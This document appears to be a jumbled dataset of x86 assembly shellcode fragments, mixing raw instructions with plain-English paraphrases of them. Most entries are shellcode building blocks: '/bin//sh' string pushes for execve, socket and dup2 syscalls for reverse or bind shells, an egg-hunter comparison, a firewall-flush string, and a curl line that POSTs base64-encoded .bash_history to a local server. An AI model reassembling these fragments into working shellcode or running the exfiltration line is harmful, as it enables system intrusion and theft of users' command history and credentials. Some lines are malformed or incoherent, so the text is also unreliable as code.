a db 'c'
"mov eax, 19"
push 0xb onto the stack
push the 0x5c4b onto the stack
make the system call pause
"xor eax, eax \n cmp edx, eax \n je l3"
push 0xb
"push 0x6e7a762d \n mov ebx, esp"
"lea esi, [esi+13]"
define the exit label
"push long 0x68732f2f \n push long 0x6e69622f \n mov ecx, esp"
msg2 db 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0x0a
re
move the contents of the al register into the al register
"cmp dword [eax-4], egg1"
dec byte dl
move ecx into ebp
if the contents of the cl register is equal to the contents of the dl register then jump to the init label else increment the contents of the cl register
"cmp edx, ebx \n je 0x8 \n mov ebx, edx"
"mov byte al, 0x3f"
if the contents of the ax register is not equal to the contents of the bx register then jump to the l3 label else jump to the while label
"cmp ax, bx \n jne l3 \n jmp while"
restore the top of the stack into the ebp register
increment the contents of the memory at the memory location specified by the operation [esp]
restore the top of the stack into the ecx register then decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else make the system call exit
if the contents of the eax register is negative then jump to the label _while_loop
"add byte [var], 10"
zero out the ebx register and push zero onto the stack
"cmp eax, 0"
"xor eax, eax \n push eax"
"mov al, byte 2h"
jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register
move 11 into al
move 0x3b into the cx register
"mov ax, [esi+4*esi]"
"cmp bl, al \n je loop_2"
"mov dword [esp-4], esi"
compare the contents of al with the cl register
move close_syscall into al
dec byte [eax]
"push 0x68732f2f \n push 0x6e69622f \n mov eax, esp"
clear the ax register
ret
"xor ecx, ecx"
push 0x78
jump to the label _convert if the contents of the eax register is not zero
cld
move edx into edi
push ax to the stack
clear the ebx register
invoke subroutine socket
jump to label _read if the zero flag is set
jump to the _close label if the zero flag is set
if the contents of the eax register is not zero then jump to the label _parent
"mov dl, byte [eax]"
push 0xdb
inc count
"cmp dl, cl \n jb l1 \n mov al, 0x39"
"mov ebx, esp"
div dword [eax]
move write_syscall into al
init edi 0
"sub eax, 5"
move cl into the address [esi+eax]
"mov al, 0x5"
"lea edx, [ebx+12]"
perform xor operation between the value stored at the location ecx+116 and dh
jump to the label found if the contents of the al register is zero else increment the contents of the ecx register
inc ecx
db '0'
allocate my_var contents of the ecx register
"mov ebx, 1"
"mov ebx, m_src1"
move /bin/sh into the edx register
"mov bl, 0x1"
move b to eax
push the 0x31373737 onto the stack
compare if eax is zero
execute exit syscall
call the function in the stack
push dword 0x04f2f
reset both lower and uppper bytes of ecx to be 0
"mov byte [esp+3], 0x01"
move 0x3f into the byte in al
if zero jump to the child label
push 0x78
pop bx
"test eax, eax \n jnz _convert"
declare the label finished
"mov byte [esi+eax], cl"
pop eax
subtract 0x24 from the contents in esp and save the result in esp
"mov eax, 29"
decoded:
"xor edi, edi"
push 0x2f2f6e2f
push the dword 0x2f6e6962 onto the stack
"add al, 0x33"
left shift the contents of edx register by 9 bit positions
push word 0xffffffff
move ecx into ebx
restore the top of the stack into the bx register
"push 0x2f2f2f2f \n mov edi, esp"
"mov edx, 11"
move 11 into edx
move m_src1 into ebx
clear the bh register
move the 4 bytes of memory address esi+4*esi into edx
dec ecx \n jns loop2
push the dword 0x04f2f onto the stack
move 0xc into dl
push the byte 6 to the stack
if the contents of the eax register is not zero then jump to the label _parent
"push 10 \n mov eax, esp"
push 0x6e69622f
push the double word 0x3a303a onto the stack
jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register else move the contents of the edx register into the ebx register
move address of 4294948047 variable into ecx
push 0x76766c2d
"mov al, 0x66"
add 10 to the byte stored at memory location var
decrement ecx and jumps to the decode label unless decrementing ecx caused its value to become zero
push esp to the stack
call iprintlf
left shift the contents of eax by 5
move address of stack pointer into edx
push 0x2f2f6e onto the stack
jz next
move 0x3 into the byte at address [esp+3]
restore the top of the stack into the cx register
move esi into the doubleword starting at the address esp-4
jump to the label check_html if the contents of the eax register is zero
db '/sbin/iptables#-f#'
clear edx register
push the double word 0x2f3a2f3a onto the stack
"mov [esi+22], al"
decrement the contents of the ecx register and jump to the program label if the result is not negative
push 0x69616863 to the stack
"sub bx, 1663"
push 0x69616863
define do_dup label
pop esi
"mov [var], eax"
move the contents of the esp register into the ebx register
push 0x39396a onto the stack
push the 0x53534150 onto the stack
"mov al, 11"
make the systemcall socketcall
invoke sys_fork
"mov byte [buff], 7ah"
"define port as an array of bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77"
"mov eax, 65"
push the contents of the edi register onto the stack and point edx to the stack register
"xor ebp, ebp"
invoke sys_open
"mov ecx, y"
zero out the ecx register and push zero onto the stack
push the word 0x6f64 onto the stack
fileaddress:
"cmp bl, 78h \n jle short loc_402B1D"
"mov eax, 0x33392"
load the effective address of the result of the operation [esi+13] into the edi register
"push 0x6374652f \n mov esi, esp"
jump short to theeh label
push 0x68736162 to the stack
execute exit syscall
"cmp cl, 12 \n jg l2"
make the system call getpgrp
"mov bl, 0x9"
"pop ecx \n loop l3 \n mov eax, 1"
push word 0544o
extend the sign bit of eax into the edx register
"mov ecx, 4294948047"
"xor al, 0x41"
push byte 16 \n pop eax
jump to the exit label if the contents of the dl register is equal to the vale 1 else jump to the reading label
move 0x0 into ecx
compare the contents of bl and save the result into bl
move 0x65636170 into esi
push 0x37373333 to the stack
"shl eax, 5"
zero out the ebx register and jump to the exit label if the contents of the eax register is equal to the contents of the ebx register
"lea esi, [esi +4]"
"mov eax, 27"
if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8 else zero out the eax register
execute exit syscall
push the dword 0x6b7379 onto the stack
subtract 5 from the contents of the eax register
sigaction
push the value of register ecx onto the stack
add edi to edi
push ax
move decimal number 3 into ebx
do_dup:
"xor ebx, ebx"
move 102 into ax
swap the contents of eax and esi
jz child
move the byte at the address [ 7] into cl
jump to label read
